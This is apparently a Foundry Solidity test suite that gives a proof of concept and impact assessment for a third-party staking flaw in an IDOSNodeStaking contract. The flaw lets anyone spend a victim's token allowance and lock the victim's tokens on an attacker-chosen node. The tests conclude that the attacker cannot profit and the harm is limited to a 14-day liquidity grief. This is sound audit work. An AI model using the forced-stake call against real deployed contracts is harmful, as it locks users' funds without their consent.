// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test} from "forge-std/Test.sol";
import {IDOSToken} from "../src/IDOSToken.sol";
import {IDOSNodeStaking} from "../src/IDOSNodeStaking.sol";

/// @notice PoC + impact assessment for the hypothesis:
///         "IDOSNodeStaking.stake(address user, address node, uint256 amount) lets a
///          third party spend a victim's ERC20 allowance towards the staking contract
///          and lock the victim's tokens on an attacker-chosen node."
///
/// This suite deliberately measures *actual* attacker profit and *actual* victim
/// loss, so the severity can be judged on evidence rather than assumption.
contract SecurityThirdPartyStakePoC is Test {
    IDOSToken token;
    IDOSNodeStaking staking;

    address owner = makeAddr("owner");
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");
    address honestNode = makeAddr("honest-node");
    address attackerNode = makeAddr("attacker-node");

    uint48 constant START_TIME = 365 days;
    uint256 constant VICTIM_BALANCE = 1_000;

    function setUp() public {
        vm.prank(owner);
        token = new IDOSToken(owner);

        vm.prank(owner);
        staking = new IDOSNodeStaking(address(token), owner, START_TIME, 100);

        // Fund the staking contract with the reward pool.
        vm.prank(owner);
        token.transfer(address(staking), 10_000);

        vm.prank(owner);
        token.transfer(victim, VICTIM_BALANCE);

        // Realistic victim setup: unlimited allowance to the staking contract so the
        // user can stake repeatedly without re-approving (the common DeFi pattern).
        vm.prank(victim);
        token.approve(address(staking), type(uint256).max);

        vm.prank(owner);
        staking.allowNode(honestNode);
        vm.prank(owner);
        staking.allowNode(attackerNode);

        vm.warp(START_TIME);
    }

    /// @dev Baseline: the hypothesis is factually reproducible - an unauthorised
    ///      third party CAN move a victim's approved tokens into the staking
    ///      contract and attribute the stake to a node of the attacker's choosing.
    function test_PoC_UnauthorisedThirdPartyCanSpendVictimAllowance() public {
        uint256 victimBefore = token.balanceOf(victim);
        uint256 attackerBefore = token.balanceOf(attacker);

        vm.prank(attacker);
        staking.stake(victim, attackerNode, VICTIM_BALANCE);

        // Victim's liquid balance was consumed without the victim's consent.
        assertEq(token.balanceOf(victim), victimBefore - VICTIM_BALANCE, "victim tokens moved");
        // Stake is booked to the victim, on the attacker's node.
        assertEq(staking.stakeByNodeByUser(victim, attackerNode), VICTIM_BALANCE);
        assertEq(staking.getNodeStake(attackerNode), VICTIM_BALANCE);
        // Attacker gained NOTHING.
        assertEq(token.balanceOf(attacker), attackerBefore, "attacker must gain nothing here");
    }

    /// @dev Impact ceiling test #1: the stake is credited to the *victim*, and
    ///      unstake() is msg.sender-scoped, so the victim retains full control and
    ///      recovers 100% of the funds after the ordinary unbonding delay.
    ///      => NO theft, NO permanent loss, NO attacker profit.
    function test_PoC_NoTheft_VictimRetainsControlAndRecoversEverything() public {
        vm.prank(attacker);
        staking.stake(victim, attackerNode, VICTIM_BALANCE);

        // Victim can freely exit the attacker-chosen node.
        vm.prank(victim);
        staking.unstake(attackerNode, VICTIM_BALANCE);

        vm.warp(block.timestamp + staking.UNSTAKE_DELAY() + 1);

        vm.prank(victim);
        staking.withdrawUnstaked();

        assertEq(token.balanceOf(victim), VICTIM_BALANCE, "victim recovers full balance");
    }

    /// @dev Impact ceiling test #2: worst realistic case - the attacker-chosen node
    ///      is later slashed by the owner. The victim's stake is then confiscated to
    ///      the *owner* (protocol), not to the attacker. The attacker realises zero
    ///      profit, so there is no rational incentive for this action.
    function test_PoC_WorstCase_NodeSlashed_AttackerProfitIsZero() public {
        vm.prank(attacker);
        staking.stake(victim, attackerNode, VICTIM_BALANCE);

        // Only the owner can slash - the attacker has no way to trigger this itself.
        vm.prank(attacker);
        vm.expectRevert();
        staking.slash(attackerNode);

        vm.prank(owner);
        staking.slash(attackerNode);

        uint256 ownerBefore = token.balanceOf(owner);
        vm.prank(owner);
        staking.withdrawSlashedStakes();

        // Funds go to the protocol owner, not the attacker.
        assertEq(token.balanceOf(owner), ownerBefore + VICTIM_BALANCE);
        assertEq(token.balanceOf(attacker), 0, "attacker profit is ZERO");
        assertEq(token.balanceOf(victim), 0);
    }

    /// @dev Impact ceiling test #3: the residual issue is a liquidity grief -
    ///      the victim's tokens become unstakeable-locked for UNSTAKE_DELAY.
    ///      Quantify the grief window explicitly.
    function test_PoC_ResidualImpactIsBoundedLiquidityGrief() public {
        vm.prank(attacker);
        staking.stake(victim, attackerNode, VICTIM_BALANCE);

        // Victim can unstake immediately...
        vm.prank(victim);
        staking.unstake(attackerNode, VICTIM_BALANCE);

        // ...but cannot move the tokens for the whole unbonding window.
        vm.warp(block.timestamp + staking.UNSTAKE_DELAY() - 1);
        vm.prank(victim);
        vm.expectRevert();
        staking.withdrawUnstaked();

        assertEq(staking.UNSTAKE_DELAY(), 14 days);
    }

    /// @dev Determinism / reachability check: repeated forced staking never yields
    ///      attacker profit and never breaks the victim's ability to exit.
    function test_PoC_RepeatedForcedStakingNeverPaysTheAttacker() public {
        for (uint256 i; i < 5; ++i) {
            vm.prank(attacker);
            staking.stake(victim, attackerNode, 100);
        }

        assertEq(staking.stakeByNodeByUser(victim, attackerNode), 500);
        assertEq(token.balanceOf(attacker), 0, "attacker never profits");

        vm.prank(victim);
        staking.unstake(attackerNode, 500);

        vm.warp(block.timestamp + staking.UNSTAKE_DELAY() + 1);
        vm.prank(victim);
        uint256 got = staking.withdrawUnstaked();

        assertEq(got, 500, "victim recovers everything");
        assertEq(token.balanceOf(victim), VICTIM_BALANCE);
    }
}
